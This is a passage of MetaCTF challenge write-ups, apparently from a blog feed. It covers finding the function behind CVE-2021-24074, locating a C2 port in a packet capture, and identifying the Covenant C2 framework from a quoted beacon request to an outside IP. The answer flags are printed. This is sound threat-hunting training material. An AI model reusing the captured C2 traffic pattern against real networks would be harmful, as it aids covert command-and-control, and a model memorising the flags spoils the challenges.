+&lt;/h1>&lt;p>Sometimes, routers can break packets up into fragments to meet abnormal networking requirements, and the endpoint will be responsible for putting these back together. Sometimes however, this doesn&amp;rsquo;t go as planned, as Microsoft found out with CVE-2021-24074. We&amp;rsquo;d like to see the function responsible for this vulnerability, but we&amp;rsquo;re having some trouble finding its name&amp;hellip; Could you see if you could find it?&lt;/p>
+&lt;h2 id="solve-7" >Solve
+&lt;span>
+&lt;a href="#solve-7">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>&lt;a href="https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web">https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/">https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/&lt;/a>&lt;/p>
+&lt;p>&lt;code>MetaCTF{Ipv4pReceiveRoutingHeader}&lt;/code>&lt;/p>
+&lt;h1 id="pattern-of-life" >Pattern of Life
+&lt;span>
+&lt;a href="#pattern-of-life">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.&lt;/p>
+&lt;p>Today you just received a packet capture (pcap) from a user&amp;rsquo;s workstation. We think that an attacker may have compromised the user&amp;rsquo;s machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was &lt;em>not&lt;/em> using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We&amp;rsquo;d like you to submit the port number that the C2 server is listening on in the form of MetaCTF{portnumber} as the flag.&lt;/p>
+&lt;h2 id="solve-8" >Solve
+&lt;span>
+&lt;a href="#solve-8">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>So from the prompt, we know we should look at HTTP(S) things. HTTP Command and Control beaconing is a thing.&lt;/p>
+&lt;ol>
+&lt;li>Look at the HTTP Objects: File -&amp;gt; Export Objects -&amp;gt; HTTP Objects&lt;/li>
+&lt;li>Notice the port is 8080&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>MetaCTF{8080}&lt;/code>&lt;/p>
+&lt;h1 id="the-searcher" >The Searcher
+&lt;span>
+&lt;a href="#the-searcher">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Alright analyst. We need your help with some investigative work as we dive deeper into one of the infections on our company&amp;rsquo;s network. We&amp;rsquo;ve taken a small packet capture that we know contains some C2 traffic. In order to give us some more leads for the investigation though, we&amp;rsquo;d like to see if we can identify what C2 framework the attacker was using. This will give us some leads into potential host-based artifacts that might be left behind.&lt;/p>
+&lt;p>Please submit the name of the C2 Framework being used in the form of MetaCTF{c2frameworkname}&lt;/p>
+&lt;h2 id="solve-9" >Solve
+&lt;span>
+&lt;a href="#solve-9">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Looking at the pcap -&amp;gt; notice the user agent (this is a good way to identify C2 frameworks).&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /en-us/docs.html HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+Host: 52.44.115.131:8080
+Cookie: ASPSESSIONID=fc1060eace; SESSIONID=1552332971750
+HTTP/1.1 200 OK
+Date: Mon, 22 Nov 2021 01:33:24 GMT
+Content-Type: text/plain; charset=utf-8
+Server: Microsoft-IIS/7.5
+Transfer-Encoding: chunked
+&lt;/code>&lt;/pre>&lt;p>Google search on the SESSIONID: find &lt;a href="https://github.com/sclow/covenant_mgmt/blob/main/config.yml.example">GitHub&lt;/a>&lt;/p>
+&lt;p>&lt;code>MetaCTF{Covenant}&lt;/code>&lt;/p></description></item></channel></rss>
